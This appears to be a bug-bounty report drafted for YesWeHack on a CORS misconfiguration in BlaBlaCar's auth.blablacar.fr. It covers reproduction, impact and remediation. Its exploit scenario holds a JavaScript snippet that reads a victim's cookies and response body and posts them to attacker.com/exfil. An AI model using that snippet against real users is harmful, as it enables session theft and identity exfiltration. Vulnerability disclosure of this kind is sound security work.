# BlaBlaCar YesWeHack Submission — CORS reflect-origin-with-creds on auth.blablacar.fr

**Submit at:** https://yeswehack.com/programs/blablacar
**Program:** BlaBlaCar Bug Bounty Program (VDP — no monetary reward, Hall of Fame)
**In-scope:** `https://auth.blablacar.fr` explicitly listed
**Realistic payout:** $0 + reputation/Hall-of-Fame credit

---

## Title
```
CORS misconfiguration — auth.blablacar.fr reflects any Origin + ACAC:true on auth endpoint (universal credentialed CSRF)
```

## Severity
**High** (CORS reflect-with-creds on authentication endpoint = identity exfiltration + CSRF-token bypass)

## Description (paste into YesWeHack form)

```
## Summary

`auth.blablacar.fr` returns CORS headers that allow ANY origin to make
credentialed requests:

  Access-Control-Allow-Origin: <reflects whatever the request's Origin is>
  Access-Control-Allow-Credentials: true
  Access-Control-Expose-Headers: x-dd-b, x-set-cookie

The endpoint is fronted by Istio (per `server: istio-envoy`) and is the
authentication service for BlaBlaCar France (and per the CORS+expose-
headers config, likely applies across the entire blablacar.* zone).

This means any third-party site can use a victim's session cookies to
make requests to auth.blablacar.fr and read the response — including
exposing the `x-set-cookie` header which is normally hidden from
cross-origin JS.

## Steps to reproduce

1. Verify with arbitrary attacker origin:

   $ curl -ki "https://auth.blablacar.fr/api/v1/users/me" -H "Origin: https://evil.com"
   HTTP/2 403
   access-control-allow-credentials: true
   access-control-expose-headers: x-dd-b, x-set-cookie
   access-control-allow-origin: https://evil.com           ← REFLECTED
   x-dd-b: 1
   set-cookie: datadome=...
   x-envoy-upstream-service-time: 11
   pragma: no-cache
   server: istio-envoy
   x-datadome: protected

2. The HTTP 403 with `x-datadome: protected` confirms this is a real
   endpoint that's auth-protected (the 403 is the DataDome WAF
   rejecting the request because it lacks proper auth).

3. The `Access-Control-Expose-Headers: x-dd-b, x-set-cookie` is
   particularly dangerous — `x-set-cookie` is exposed cross-origin,
   meaning cross-origin JS can read Set-Cookie values that browsers
   normally hide.

## Exploit scenario

A malicious page (e.g., evil.com/blablacar-attack.html):

  <script>
    fetch("https://auth.blablacar.fr/api/v1/users/me", {
      credentials: "include"
    })
    .then(r => {
      const setCookie = r.headers.get("x-set-cookie");
      const body = r.text();
      return Promise.all([setCookie, body]);
    })
    .then(([cookie, body]) => {
      fetch("https://attacker.com/exfil", {
        method: "POST",
        body: JSON.stringify({ cookie, body })
      });
    });
  </script>

When an authenticated BlaBlaCar France user visits evil.com:
- Browser sends authenticated request with session cookies
- auth.blablacar.fr responds with ACAO: https://evil.com + ACAC: true
- evil.com's JS reads both the body AND the x-set-cookie header
- Attacker exfiltrates user identity + session cookie values

## Impact

- **Identity exfiltration** of authenticated BlaBlaCar France users
- **`x-set-cookie` cross-origin disclosure**: cookie values normally
  hidden from cross-origin JS are exposed via Access-Control-Expose-
  Headers
- **CSRF-token bypass**: state-changing endpoints' tokens become
  cross-origin readable
- **Potentially applies across the entire `blablacar.*` zone** since
  this is the auth service shared by 18+ country domains

## Scope

`auth.blablacar.fr` is explicitly listed in the BlaBlaCar YesWeHack
program scope:

> https://auth.blablacar.(fr|de|co.uk|in|es|mx|be|hr|hu|it|nl|pl|com.br|pt|ro|ru|com|tr|com.ua)

## Remediation

1. **Replace Origin reflection with strict allowlist** of BlaBlaCar
   first-party domains (`https://www.blablacar.fr`,
   `https://m.blablacar.fr`, etc.)
2. **Remove `x-set-cookie` from `Access-Control-Expose-Headers`** —
   this header should NEVER be exposed cross-origin
3. **Audit Istio gateway CORS config** that applies to auth.blablacar.*

## Tooling

Discovered via Lictor (https://lictor-ai.com) — open-source security
scanner (Apache 2.0).

## References

- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- PortSwigger CORS-with-creds:
  https://portswigger.net/web-security/cors
```
